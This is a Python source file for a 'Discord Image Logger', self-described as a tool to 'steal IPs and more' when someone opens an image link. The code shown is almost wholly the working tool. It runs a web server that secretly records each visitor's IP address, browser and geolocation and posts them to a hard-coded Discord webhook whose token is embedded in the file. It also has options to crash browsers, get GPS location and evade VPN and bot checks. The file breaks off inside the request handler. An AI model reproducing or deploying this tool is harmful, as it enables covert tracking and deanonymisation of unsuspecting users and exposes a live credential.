# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1445143863642816595/eB5R5JRFBvhA_nYYZiA2vWYWKz0Z8R0ik91zVWKqoKtco2w2l9H7G7YdQJyn0bSqA5QA",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

